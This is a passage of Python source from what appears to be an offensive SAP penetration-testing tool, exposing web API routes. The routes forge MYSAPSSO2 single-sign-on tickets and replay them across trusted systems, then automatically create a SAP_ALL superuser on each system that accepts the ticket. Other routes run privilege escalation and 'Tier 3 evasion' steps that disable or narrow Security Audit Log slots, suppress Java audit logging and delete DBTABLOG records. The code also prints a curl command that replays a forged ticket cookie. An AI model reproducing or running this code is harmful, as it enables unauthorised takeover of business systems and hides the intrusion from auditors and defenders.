                    continue
                if issuer_sid:
                    resolved += 1
                rel = TrustRelation(
                    trusting_sid=sid,
                    trusting_client=e.get("trusting_client", ""),
                    issuer_sid=issuer_sid,
                    issuer_cert_subject_dn=subject,
                    issuer_cert_serial=serial,
                    trust_method="strustsso2",
                    discovered_via=e.get("source", ""),
                )
                api.state.trust_relations.append(rel)
                existing_keys.add(key)
                sys_added += 1

            if user_identities:
                node.usrextid_entries = user_identities

            # ----------------------------------------------------------
            # Additional source: RFCTRUST.
            #
            # An outbound RFCTRUST entry from system A pointing at
            # system B means SAP has registered A's SAPSYS cert in B's
            # STRUSTSSO2 trustbox (the trusted RFC mechanism uses
            # assertion tickets signed by A's PSE; B validates via
            # STRUSTSSO2).  So each RFCTRUST row is direct evidence
            # of an STRUSTSSO2 trust edge in the OPPOSITE direction:
            #   RFCTRUST row {RFCTRUSTID=B, RFCTRUSTSY=A} on A
            #   ⇒ TrustRelation(trusting_sid=B, issuer_sid=A)
            # ----------------------------------------------------------
            try:
                _trust_sess, _ = resolve_soap_session_for_node(
                    api.state, node)
                if _trust_sess is not None:
                    rfctrust = sapmap_rfc.retrieve_rfctrust_via_soap(
                        node, _trust_sess)
                else:
                    rfctrust = sapmap_rfc.retrieve_rfctrust(
                        node, creds)
            except Exception as e:
                logger.debug(f"RFCTRUST read failed during STRUSTSSO2 "
                             f"discovery for {sid}: {e}")
                rfctrust = []

            rfctrust_added = 0
            for t in rfctrust:
                partner = (t.get("rfctrustid") or "").strip()
                issuer = (t.get("rfctrustsy") or sid).strip()
                if not partner or partner == issuer:
                    continue
                key = (partner, issuer, "", "")
                if key in existing_keys:
                    continue
                rel = TrustRelation(
                    trusting_sid=partner,
                    trusting_client="",
                    issuer_sid=issuer,
                    issuer_cert_subject_dn="",
                    issuer_cert_serial="",
                    trust_method="strustsso2",
                    discovered_via="RFCTRUST",
                )
                api.state.trust_relations.append(rel)
                existing_keys.add(key)
                rfctrust_added += 1
                if partner in api.state.nodes:
                    resolved += 1

            sys_added += rfctrust_added

            print(f"[+] {sid}: STRUSTSSO2 discovery added "
                  f"{sys_added} new system-trust relations "
                  f"({resolved} resolved to known SIDs), "
                  f"{usr_added} user-identity mappings recorded"
                  + (f"; {rfctrust_added} from RFCTRUST"
                     if rfctrust_added else ""))

        _bg(f"{sid}:discover_strustsso2",
            "Discover STRUSTSSO2 trust", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/forge_and_fanout", method="POST")
    def node_forge_and_fanout(sid):
        """Forge a MYSAPSSO2 ticket then auto-replay it against every
        STRUSTSSO2-trusted receiver in state.trust_relations whose
        issuer_sid matches this node.

        Body parameters (all optional):
            user, client, validity_min, digest, recipient_sid,
            recipient_client, channels, timeout
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        user = data.get("user", "SAP*")
        client = data.get("client", "100")
        validity_min = int(data.get("validity_min") or 120)
        digest = data.get("digest", "sha1")
        recipient_sid = data.get("recipient_sid") or None
        recipient_client = data.get("recipient_client") or None
        channels = data.get("channels") or ["http", "rfc"]
        timeout = int(data.get("timeout") or 10)

        def _run():
            from sapmap_exploit import extract_and_forge_ticket
            from sap_ticket_propagate import (
                propagate_via_forged_ticket)

            def _target_clients(target_node, rel_client):
                """Return list of client numbers to try on the target.

                Priority: rel.trusting_client (specifically set in
                the trust relation) → target_node.clients (enumerated
                during discovery) → operator-supplied recipient_client
                → operator-supplied client (from the prompt fallback)
                → SAP defaults [001, 000].

                NEVER falls back to the source-system's client (which
                may not exist on the target — e.g. issuer has 100 but
                target only has 000/001).
                """
                if rel_client:
                    return [rel_client]
                enumerated = []
                for c in (target_node.clients or []):
                    nr = (c.get("nr") if isinstance(c, dict)
                          else str(c)) or ""
                    nr = nr.strip().zfill(3)
                    if nr and nr not in enumerated:
                        enumerated.append(nr)
                if enumerated:
                    enumerated = ([c for c in enumerated if c != "000"]
                                  + [c for c in enumerated if c == "000"])
                    return enumerated
                if recipient_client:
                    return [recipient_client]
                # Use the operator's prompt value as the named fallback
                if client:
                    return [client.strip().zfill(3)]
                return ["001", "000"]

            def _build_fanout_targets():
                """Walk state.trust_relations and return list of
                (target_sid, target_client) tuples this node can
                forge tickets for."""
                targets = []
                seen = set()
                for rel in api.state.trust_relations:
                    if rel.issuer_sid != sid:
                        continue
                    if rel.trusting_sid == sid:
                        continue
                    tnode = api.state.nodes.get(rel.trusting_sid)
                    if not tnode:
                        continue
                    for tgt_c in _target_clients(
                            tnode, rel.trusting_client):
                        k = (rel.trusting_sid, tgt_c)
                        if k in seen:
                            continue
                        seen.add(k)
                        targets.append((rel.trusting_sid, tgt_c))
                return targets

            # Derive fanout targets from state.trust_relations FIRST
            # so we can forge per-target pinned tickets.
            fanout_targets = _build_fanout_targets()

            if not fanout_targets:
                # No trust relations for this node yet — implicitly run
                # STRUSTSSO2 discovery now so the operator doesn't have
                # to do a separate manual step first.
                print(f"[*] {sid}: no STRUSTSSO2-trusted receivers "
                      f"known yet — running 'Discover STRUSTSSO2 "
                      f"trust' implicitly first...")
                creds = node.best_credentials()
                if not creds:
                    print(f"[-] {sid}: no credentials available for "
                          f"implicit STRUSTSSO2 discovery — abort")
                    return
                from sapmap_models import TrustRelation
                try:
                    _strust_sess, _ = resolve_soap_session_for_node(
                        api.state, node)
                    if _strust_sess is not None:
                        entries = (
                            sapmap_rfc.
                            retrieve_strustsso2_trust_via_soap(
                                node, _strust_sess))
                    else:
                        entries = (
                            sapmap_rfc.retrieve_strustsso2_trust(
                                node, creds))
                except Exception as e:
                    print(f"[-] {sid}: STRUSTSSO2 read failed: {e}")
                    entries = []
                try:
                    _ts, _ = resolve_soap_session_for_node(
                        api.state, node)
                    if _ts is not None:
                        rfctrust = sapmap_rfc.retrieve_rfctrust_via_soap(
                            node, _ts)
                    else:
                        rfctrust = sapmap_rfc.retrieve_rfctrust(
                            node, creds)
                except Exception as e:
                    print(f"[-] {sid}: RFCTRUST read failed: {e}")
                    rfctrust = []

                cert_to_sid = {}
                for other_sid, other_node in api.state.nodes.items():
                    dn = (other_node.sapsys_cert_subject_dn
                          or "").strip()
                    if dn:
                        cert_to_sid[dn] = other_sid

                existing_keys = {
                    (r.trusting_sid, r.issuer_sid,
                     r.issuer_cert_subject_dn, r.issuer_cert_serial)
                    for r in api.state.trust_relations
                }

                for e in entries:
                    if e.get("kind", "system") != "system":
                        continue
                    subject = e.get("subject_dn", "") or ""
                    serial = e.get("serial", "") or ""
                    issuer_sid = (e.get("issuer_sid", "") or "")
                    issuer_sid = issuer_sid or cert_to_sid.get(
                        subject, "")
                    key = (sid, issuer_sid, subject, serial)
                    if key in existing_keys:
                        continue
                    api.state.trust_relations.append(TrustRelation(
                        trusting_sid=sid,
                        trusting_client=e.get(
                            "trusting_client", ""),
                        issuer_sid=issuer_sid,
                        issuer_cert_subject_dn=subject,
                        issuer_cert_serial=serial,
                        trust_method="strustsso2",
                        discovered_via=e.get("source", ""),
                    ))
                    existing_keys.add(key)
                for t in rfctrust:
                    partner = (t.get("rfctrustid") or "").strip()
                    issuer = (t.get("rfctrustsy") or sid).strip()
                    if not partner or partner == issuer:
                        continue
                    key = (partner, issuer, "", "")
                    if key in existing_keys:
                        continue
                    api.state.trust_relations.append(TrustRelation(
                        trusting_sid=partner,
                        issuer_sid=issuer,
                        trust_method="strustsso2",
                        discovered_via="RFCTRUST",
                    ))
                    existing_keys.add(key)

                # Try again now that trust_relations has been populated
                fanout_targets = _build_fanout_targets()

            if not fanout_targets:
                print(f"[*] {sid}: no STRUSTSSO2-trusted receivers "
                      f"found after discovery (no RFCTRUST entries "
                      f"and no readable STRUSTSSO2 trust on this "
                      f"node)")
                return

            print(f"[*] {sid}: Forge & Fanout — {len(fanout_targets)} "
                  f"target(s): "
                  f"{', '.join(f'{t}/{c}' for t, c in fanout_targets)}")
            print(f"[*] {sid}: forging a SEPARATE pinned ticket per "
                  f"target (modern kernels reject unpinned tickets "
                  f"under SAP Note 2210918 hardening)")

            succeeded = 0
            tried = 0
            for target_sid, target_client in fanout_targets:
                tried += 1
                target_node = api.state.nodes.get(target_sid)
                if not target_node:
                    print(f"[-] {target_sid}: target not on the map — "
                          f"skipping")
                    continue

                # The impersonation client (MANDT in InfoUnit 0x02)
                # determines which client the receiver looks the user
                # up in.  Use the target's client — the ticket claims
                # "this user, in this client on the target".
                impersonation_client = target_client
                print(f"[*] {sid}: forging ticket "
                      f"{user}/{impersonation_client} pinned for "
                      f"{target_sid}/{target_client}...")
                r = extract_and_forge_ticket(
                    node=node, state=api.state,
                    user=user, client=impersonation_client,
                    validity_min=validity_min, digest=digest,
                    recipient_sid=target_sid,
                    recipient_client=target_client,
                )
                if not r.get("success"):
                    print(f"[-] {sid}: forgery failed: "
                          f"{r.get('error')}")
                    continue
                ticket = r["ticket"]

                # Surface a manual-test curl so the operator can
                # repeat the probe outside SAPMAP.
                tgt_host = (target_node.ip or target_node.hostname
                            or "?")
                tgt_inst = ((target_node.instances[0].instance_nr
                             if target_node.instances else "00")
                            or "00").zfill(2)
                try:
                    https_port = 44300 + int(tgt_inst)
                except ValueError:
                    https_port = 44300
                print(f"[*] {target_sid}: manual test command:")
                print(f"      curl -k -i "
                      f"'https://{tgt_host}:{https_port}/sap/bc/ping' "
                      f"--cookie 'MYSAPSSO2={ticket.cookie_b64}'")

                # Replay against this specific target
                print(f"[*] {target_sid}: replaying ticket via "
                      f"{', '.join(channels)}")
                prop = propagate_via_forged_ticket(
                    ticket=ticket, target_node=target_node,
                    state=api.state, channels=channels,
                    timeout=timeout)
                mark = "✓" if prop["success"] else "✗"
                ev = (prop.get("evidence")
                      or prop.get("error", ""))[:200]
                ch = prop.get("channel", "—")
                print(f"      [{mark}] {target_sid:6s} {ch:6s} {ev}")
                if prop["success"]:
                    succeeded += 1
                    # Auto-chain: create SAPMAP00 on the target via
                    # the validated ticket (SOAP RFC over HTTP).
                    try:
                        from sapmap_exploit import (
                            create_user_via_ticket)
                        http_port = 0
                        # Use the same port that just worked
                        for att in prop.get("attempts", []):
                            if att.get("success") and att.get("port"):
                                http_port = int(att["port"])
                                break
                        use_https = True
                        for att in prop.get("attempts", []):
                            if att.get("success"):
                                use_https = bool(
                                    att.get("use_https", True))
                                break
                        print(f"[*] {target_sid}: auto-chain → "
                              f"creating SAPMAP user via validated "
                              f"ticket cookie")
                        cu_r = create_user_via_ticket(
                            target_node=target_node,
                            state=api.state, ticket=ticket,
                            target_client=target_client,
                            http_port=http_port,
                            use_https=use_https, timeout=timeout)
                        if cu_r["success"]:
                            print(f"[+] {target_sid}: PWNED — "
                                  f"{cu_r['username']}/"
                                  f"{cu_r['client']} created with "
                                  f"SAP_ALL")
                        else:
                            print(f"[!] {target_sid}: user creation "
                                  f"failed: {cu_r.get('error', '?')}")
                    except Exception as e:
                        print(f"[!] {target_sid}: auto user creation "
                              f"hit exception: {e}")
                else:
                    # Diagnostic hints for common rejection modes
                    err_lower = ev.lower()
                    if "401" in ev or "unauthorized" in err_lower:
                        print(f"            hint: 401 = signature/"
                              f"recipient validation FAILED.")
                        print(f"            MOST LIKELY: {sid}'s "
                              f"SAPSYS cert is NOT in {target_sid}'s "
                              f"System PSE trustbox.")
                        print(f"            Check on {target_sid}: "
                              f"open STRUSTSSO2 -> click 'System PSE' "
                              f"in the left tree -> 'Certificate "
                              f"List' section in the right pane.")
                        print(f"            If empty, the target "
                              f"accepts NO MYSAPSSO2 tickets at all. "
                              f"Need to import {sid}'s SAPSYS cert "
                              f"there (PSE -> Import Certificate).")
                        print(f"            Note: legacy "
                              f"license-number based Trusted RFC "
                              f"(RFCTRUST.TLICENSE_NR/LLICENSE_NR) "
                              f"works WITHOUT any STRUSTSSO2 certs — "
                              f"that's why Trusted RFC succeeds while "
                              f"ticket forgery fails. Cert-based "
                              f"trust must be set up separately "
                              f"(SM59 'Current User' + trust button, "
                              f"OR manual cert import in STRUSTSSO2).")
                    elif "403" in ev or "forbidden" in err_lower:
                        print(f"            hint: 403 = ticket "
                              f"VALIDATED, but session start FAILED. "
                              f"Most likely cause: user '{user}' does "
                              f"NOT EXIST or is LOCKED on "
                              f"{target_sid}/{target_client}.")
                        if user == "SAP*":
                            print(f"            note: SAP* is a "
                                  f"virtual super-user typically "
                                  f"present only in client 000. In "
                                  f"customer clients (100, etc.) it "
                                  f"is usually MISSING. Retry with "
                                  f"DDIC (always exists) or a known "
                                  f"business / SAPMAP-created user.")
                        else:
                            print(f"            check on "
                                  f"{target_sid}: SU01 / table USR02 "
                                  f"for user '{user}' in client "
                                  f"{target_client} — must exist + "
                                  f"unlocked + UFLAG=0")

            print(f"[+] {sid}: fanout complete — "
                  f"{succeeded}/{tried} targets accepted the ticket")

        _bg(f"{sid}:forge_and_fanout", "Forge & Fanout Ticket", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/analyse_capabilities", method="POST")
    def node_analyse_capabilities(sid):
        """Run the role / profile capability analyser against every
        user we own on this node.  Auto-runs after create_user and
        verified credential save; this endpoint exposes the same
        action for explicit invocation (operator wants to refresh
        after a privilege change, or wants to opt into the COUNT(*)
        row probe that's skipped on the auto-run path)."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        probe = bool(data.get("probe_row_counts", False))

        def _run():
            try:
                import sapmap_capability_analyser
                _cs, _ = resolve_soap_session_for_node(
                    api.state, node)
                sapmap_capability_analyser.analyse(
                    node, probe_row_counts=probe,
                    soap_session=_cs)
            except Exception as e:
                print(f"[-] {sid}: capability analyser failed — "
                      f"{e!s}")

        _bg(f"{sid}:analyse_capabilities",
            "Analyse user capabilities", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/capability_rules.yaml")
    def capability_rules_yaml():
        """Export the capability lookup table as YAML so customers
        can extend it with site-specific Z-objects.  Read-only;
        no per-engagement state."""
        import sapmap_capability_analyser
        response.content_type = "application/x-yaml; charset=utf-8"
        response.set_header(
            "Content-Disposition",
            "attachment; filename=\"sapmap_capability_rules.yaml\"")
        return sapmap_capability_analyser.export_rules_yaml()

    @app.route("/api/node/<sid>/lpe", method="POST")
    def node_lpe(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        method = data.get("method")  # None = try all

        def _run():
            creds = node.best_credentials()
            if not creds:
                print(f"[-] No credentials available for {sid}")
                return
            import sapmap_lpe
            success = sapmap_lpe.try_lpe(node, creds, method_name=method)
            if success:
                print(f"[+] LPE succeeded on {sid} — "
                      f"{creds.username} now has SAP_ALL")

        _bg(f"{sid}:lpe", "Local Privilege Escalation", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/tier3_sal_slot_disable", method="POST")
    def node_tier3_sal_slot_disable(sid):
        """Phase 3 step 2 — disable one SAL filter slot for a hold
        window, then auto-restore via the evasion_window context.
        First real Tier 3 mutation entry point.  Refuses unless
        --allow-evasion is armed AND a baseline has been captured."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        slotno = str(data.get("slotno") or "").strip()
        if not slotno:
            return json.dumps({"error": "slotno required"})
        profile_name = str(data.get("profile_name") or "").strip()
        try:
            hold_seconds = float(data.get("hold_seconds") or 5.0)
        except (TypeError, ValueError):
            hold_seconds = 5.0

        def _run():
            try:
                from sapmap_evasion_tier3 import tier3_sal_slot_disable
            except Exception as e:
                print(f"[-] {sid}: tier3 module unavailable: {e}")
                return
            creds = node.best_credentials()
            if creds is None or not creds.verified:
                print(f"[!] {sid}: SAL slot disable needs verified RFC "
                      f"credentials — complete user creation first")
                emit_finding("WARNING", sid,
                              "SAL slot disable skipped — no verified "
                              "RFC credentials")
                return
            print(f"[*] {sid}: Tier 3 SAL slot disable — profile "
                  f"{profile_name!r}, slot(s) {slotno!r}, hold "
                  f"{hold_seconds}s")
            out = tier3_sal_slot_disable(api.state, node, slotno,
                                            profile_name=profile_name,
                                            hold_seconds=hold_seconds,
                                            creds=creds)
            if not out.get("ok"):
                print(f"[-] {sid}: SAL slot disable failed — "
                      f"{out.get('error')}")
                emit_finding("WARNING", sid,
                              f"Tier 3 SAL slot disable failed: "
                              f"{out.get('error')}")
                return
            mode = ("STEALTH/SHM-only" if out.get("stealth_mode")
                    else f"API (disk persist: "
                         f"{out.get('stealth_warning', 'n/a')})")
            print(f"[+] {sid}: SAL slot(s) {out['slotno']} "
                  f"round-trip complete [{mode}] (baseline statuses "
                  f"{out.get('baseline_statuses')}, active before: "
                  f"{out.get('before_active_count')})")

        _bg(f"{sid}:tier3_sal_slot_disable",
             f"Tier 3: disable SAL slot {slotno}", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/evasion_baseline_param", method="GET")
    def node_evasion_baseline_param(sid):
        """Return the captured baseline value for one param.  Used by
        the GUI prompts so compound parameters (gw/logging etc.) can
        be pre-populated with their current structured value rather
        than forcing the operator to type the whole ACTION=... blob."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        param = request.query.get("param") or ""
        snap = getattr(node, "_evasion_baseline", None)
        if snap is None:
            return json.dumps({"error": "no baseline captured",
                                "value": ""})
        val = snap.params.get(param) if param else None
        if val is None:
            return json.dumps({"error": "param not in baseline",
                                "value": ""})
        if isinstance(val, str) and val.startswith("__UNCAPTURED__"):
            return json.dumps({"error": val, "value": ""})
        return json.dumps({"error": "", "value": str(val)})

    @app.route("/api/node/<sid>/tier3_set_param", method="POST")
    def node_tier3_set_param(sid):
        """Tier 3 mutation — flip an SAP profile parameter at runtime
        via TH_CHANGE_PARAMETER (shared memory only).  Holds the value
        for ``hold_seconds`` so the operator can verify in RZ11, then
        restores baseline.  Caller passes ``param`` + ``value`` + optional
        ``hold_seconds`` in the POST body.  Refuses unless --allow-
        evasion is armed AND a baseline has been captured."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        param = str(data.get("param") or "").strip()
        value = str(data.get("value") or "").strip()
        try:
            hold_seconds = float(data.get("hold_seconds") or 0.0)
        except (TypeError, ValueError):
            hold_seconds = 0.0
        if not param:
            return json.dumps({"error": "param required"})

        def _run():
            try:
                from sapmap_evasion_tier3 import tier3_set_param
            except Exception as e:
                print(f"[-] {sid}: tier3 module unavailable: {e}")
                return
            creds = node.best_credentials()
            if creds is None or not creds.verified:
                print(f"[!] {sid}: param set needs verified RFC "
                      f"credentials — complete user creation first")
                emit_finding("WARNING", sid,
                              "Tier 3 param set skipped — no verified "
                              "RFC credentials")
                return
            print(f"[*] {sid}: Tier 3 dynamic param set — "
                  f"{param}={value!r}, hold {hold_seconds}s")
            out = tier3_set_param(api.state, node, param, value,
                                    hold_seconds=hold_seconds,
                                    creds=creds)
            if not out.get("ok"):
                print(f"[-] {sid}: param set failed — {out.get('error')}")
                emit_finding("WARNING", sid,
                              f"Tier 3 param set failed: "
                              f"{out.get('error')}")
                return
            applied = out.get("applied", False)
            after_write = out.get("live_after_write", "")
            after_restore = out.get("live_after_restore", "")
            if applied:
                print(f"[+] {sid}: {param}={value!r} applied & verified "
                      f"(baseline {param}={out.get('baseline_value')!r}, "
                      f"post-restore now {after_restore!r})")
                emit_finding(
                    "INFO", sid,
                    f"Tier 3 param set: {param}={value} verified "
                    f"(restored to {after_restore!r})")
            else:
                print(f"[!] {sid}: {param} writer returned RC=0 but "
                      f"verify-read shows {after_write!r} — kernel "
                      f"silently rejected the change")
                emit_finding(
                    "WARNING", sid,
                    f"Tier 3 param set: {param}={value} "
                    f"writer-ok but kernel did not commit "
                    f"(live={after_write!r})")

        _bg(f"{sid}:tier3_set_param:{param}",
             f"Tier 3: set {param}={value}", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/tier3_sal_uname_narrow", method="POST")
    def node_tier3_sal_uname_narrow(sid):
        """Tier 3 mutation — swap one or more SAL slots' UNAME filter
        to ``replacement_uname`` for a hold window, then auto-restore.
        Stealth writer only (RSAU_UPD_AUDIT_CONFIG, SHM-only).  Refuses
        unless --allow-evasion is armed AND a baseline has been
        captured."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        slotno = str(data.get("slotno") or "").strip()
        if not slotno:
            return json.dumps({"error": "slotno required"})
        replacement = str(data.get("replacement_uname") or "").strip()
        if not replacement:
            return json.dumps({"error": "replacement_uname required"})
        try:
            hold_seconds = float(data.get("hold_seconds") or 5.0)
        except (TypeError, ValueError):
            hold_seconds = 5.0

        def _run():
            try:
                from sapmap_evasion_tier3 import tier3_sal_uname_narrow
            except Exception as e:
                print(f"[-] {sid}: tier3 module unavailable: {e}")
                return
            creds = node.best_credentials()
            if creds is None or not creds.verified:
                print(f"[!] {sid}: SAL UNAME narrow needs verified RFC "
                      f"credentials — complete user creation first")
                emit_finding("WARNING", sid,
                              "SAL UNAME narrow skipped — no verified "
                              "RFC credentials")
                return
            print(f"[*] {sid}: Tier 3 SAL UNAME narrow — slot(s) "
                  f"{slotno!r} → {replacement!r}, hold {hold_seconds}s")
            out = tier3_sal_uname_narrow(api.state, node, slotno,
                                           replacement_uname=replacement,
                                           hold_seconds=hold_seconds,
                                           creds=creds)
            if not out.get("ok"):
                print(f"[-] {sid}: SAL UNAME narrow failed — "
                      f"{out.get('error')}")
                emit_finding("WARNING", sid,
                              f"Tier 3 SAL UNAME narrow failed: "
                              f"{out.get('error')}")
                return
            print(f"[+] {sid}: SAL slot(s) {out['slotno']} UNAME swap "
                  f"round-trip complete (baseline UNAMEs "
                  f"{out.get('baseline_unames')})")

        _bg(f"{sid}:tier3_sal_uname_narrow",
             f"Tier 3: narrow SAL UNAME slot {slotno}", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/tier3_java_sal_suppress", method="POST")
    def node_tier3_java_sal_suppress(sid):
        """Tier 3 mutation — suppress Java Security Audit Log via deployed
        LogController JSP.  Sets all 6 SAL categories to Severity.NONE
        for a hold window, then auto-restores.  Runtime-only (JVM heap),
        no disk persistence."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": f"{sid} is not a Java system"})
        data = request.json or {}
        try:
            hold_seconds = float(data.get("hold_seconds") or 30.0)
        except (TypeError, ValueError):
            hold_seconds = 30.0

        def _run():
            try:
                from sapmap_evasion_tier3 import tier3_java_sal_suppress
            except Exception as e:
                print(f"[-] {sid}: tier3 java module unavailable: {e}")
                return
            print(f"[*] {sid}: Tier 3 Java SAL suppress — "
                  f"hold {hold_seconds}s")
            out = tier3_java_sal_suppress(api.state, node,
                                           hold_seconds=hold_seconds)
            if not out.get("ok"):
                print(f"[-] {sid}: Java SAL suppress failed — "
                      f"{out.get('error')}")
                emit_finding("WARNING", sid,
                              f"Tier 3 Java SAL suppress failed: "
                              f"{out.get('error')}")
                return
            print(f"[+] {sid}: Java SAL suppress round-trip complete — "
                  f"suppressed {out.get('suppress_ok', 0)} categories, "
                  f"restored {out.get('restored_count', 0)}/"
                  f"{out.get('baseline_count', 0)}")

        _bg(f"{sid}:tier3_java_sal_suppress",
             f"Tier 3: Java SAL suppress ({hold_seconds}s)", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/tier3_dbtablog_purge", method="POST")
    def node_tier3_dbtablog_purge(sid):
        """Tier 3 mutation — post-hoc purge of DBTABLOG entries written
        during the hold window.  Captures MAX(LOGID) baseline, sleeps
        hold_seconds (operator drives actions), then DELETEs entries
        with LOGID > baseline via RFC_ABAP_INSTALL_AND_RUN.  No DDIC
        touch, no DD09L mutation."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "ABAP" not in (node.system_type or "").upper():
            return json.dumps({"error": f"{sid} is not an ABAP system"})
        data = request.json or {}
        try:
            hold_seconds = float(data.get("hold_seconds") or 30.0)
        except (TypeError, ValueError):
            hold_seconds = 30.0
        raw_tabs = data.get("tabname_filter") or []
        if isinstance(raw_tabs, str):
            raw_tabs = [t.strip() for t in raw_tabs.split(",")
                        if t.strip()]
        tabname_filter = [str(t).strip().upper() for t in raw_tabs
                          if str(t).strip()]

        def _run():
            try:
                from sapmap_evasion_tier3 import tier3_dbtablog_purge
            except Exception as e:
                print(f"[-] {sid}: tier3 dbtablog module unavailable: {e}")
                return
            scope = (f"tables={','.join(tabname_filter)}"
                     if tabname_filter else "all tables")
            print(f"[*] {sid}: Tier 3 DBTABLOG purge — "
                  f"hold {hold_seconds}s, {scope}")
            out = tier3_dbtablog_purge(api.state, node,
                                         hold_seconds=hold_seconds,
                                         tabname_filter=tabname_filter)
            if not out.get("ok"):
                print(f"[-] {sid}: DBTABLOG purge failed — "
                      f"{out.get('error')}")
                emit_finding("WARNING", sid,
                              f"Tier 3 DBTABLOG purge failed: "
                              f"{out.get('error')}")
                return
            dc = out.get("deleted_count", 0)
            via = out.get("via", "?")
            rc = out.get("remaining_count", -1)
            count_phrase = (
                f"DELETE executed; {rc} row(s) remain post-baseline "
                f"(hdbsql row count not exposed by SAPXPG)"
                if dc < 0 else
                f"deleted {dc} row(s)")
            print(f"[+] {sid}: DBTABLOG purge complete via {via} — "
                  f"{count_phrase} "
                  f"(baseline="
                  f"{out.get('base_date', '?')} "
                  f"{out.get('base_time', '?')})")

        _bg(f"{sid}:tier3_dbtablog_purge",
             f"Tier 3: DBTABLOG purge ({hold_seconds}s)", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/probe_rsau_dyn_profile", method="POST")
    def node_probe_rsau_dyn_profile(sid):
        """Phase 3 step 1 — read RSAU_API_GET_PROFILE for ID_NAME='$DYN$'
        and dump the response shape so we have ground truth on the
        RSAUPROF row format before the writer is built.  Refuses
        unless --allow-evasion is armed."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            try:
                from sapmap_evasion_tier3 import tier3_probe_dyn_profile
            except Exception as e:
                print(f"[-] {sid}: tier3 probe module unavailable: {e}")
                return
            creds = node.best_credentials()
            if creds is None or not creds.verified:
                print(f"[!] {sid}: dyn profile probe needs verified RFC "
                      f"credentials — complete user creation first")
                emit_finding("WARNING", sid,
                              "Dyn profile probe skipped — no verified "
                              "RFC credentials")
                return
            print(f"[*] {sid}: Tier 3 Phase 3 step 1 — probing dynamic "
                  f"audit profile via RSAU_API_GET_PROFILE...")
            out = tier3_probe_dyn_profile(api.state, node, creds=creds)
            if not out.get("ok"):
                print(f"[-] {sid}: dyn profile probe failed — "
                      f"{out.get('error')}")
                return
            print(f"[+] {sid}: dyn profile probe — "
                  f"ET_FILT {out['et_filt_count']} row(s); "
                  f"RSAUPROF fields: "
                  f"{','.join(out['rsauprof_row_fields']) or '(empty)'}; "
                  f"loot {out['loot_path']!r}")

        _bg(f"{sid}:probe_rsau_dyn_profile",
             "Probe RSAU Dynamic Profile", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/probe_rsau_api", method="POST")
    def node_probe_rsau_api(sid):
        """Phase 2 of Tier 3 — discovery probe for the RSAU API
        surface.  Pure metadata read (FUNCTION_EXISTS +
        RFC_GET_FUNCTION_INTERFACE for each candidate).  Refuses
        unless --allow-evasion is armed."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            try:
                from sapmap_evasion_tier3 import probe_rsau_api_surface
            except Exception as e:
                print(f"[-] {sid}: tier3 probe module unavailable: {e}")
                return
            creds = node.best_credentials()
            if creds is None or not creds.verified:
                print(f"[!] {sid}: RSAU API probe needs verified RFC "
                      f"credentials — complete user creation first")
                emit_finding("WARNING", sid,
                              "RSAU API probe skipped — no verified "
                              "RFC credentials")
                return
            print(f"[*] {sid}: Tier 3 Phase 2 — probing RSAU API "
                  f"surface (FUNCTION_EXISTS + "
                  f"RFC_GET_FUNCTION_INTERFACE)...")
            out = probe_rsau_api_surface(api.state, node, creds=creds)
            if not out.get("ok"):
                print(f"[-] {sid}: RSAU API probe failed — "
                      f"{out.get('error')}")
                return
            print(f"[+] {sid}: RSAU API probe — "
                  f"{out['found_count']}/{out['total_checked']} FMs "
                  f"exist; loot {out['loot_path']!r}")

        _bg(f"{sid}:probe_rsau_api", "Probe RSAU API Surface", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/capture_evasion_baseline", method="POST")
    def node_capture_evasion_baseline(sid):
        """Tier 3 pre-flight — capture a baseline snapshot for restore-
        on-exit.  Refuses unless --allow-evasion is armed."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            try:
                from sapmap_evasion_tier3 import (
                    tier3_capture_baseline_only)
            except Exception as e:
                print(f"[-] {sid}: tier3 module unavailable: {e}")
                return
            creds = node.best_credentials()
            if creds is None or not creds.verified:
                print(f"[!] {sid}: evasion baseline needs verified RFC "
                      f"credentials — complete user creation first")
                emit_finding(
                    "WARNING", sid,
                    "Evasion baseline skipped — no verified RFC "
                    "credentials")
                return
            print(f"[*] {sid}: Tier 3 pre-flight — capturing evasion "
                  f"baseline (params + RSAU_API_GET_AUDIT_CONFIG)...")
            out = tier3_capture_baseline_only(api.state, node,
                                                creds=creds)
            if not out.get("ok"):
                print(f"[-] {sid}: baseline capture failed — "
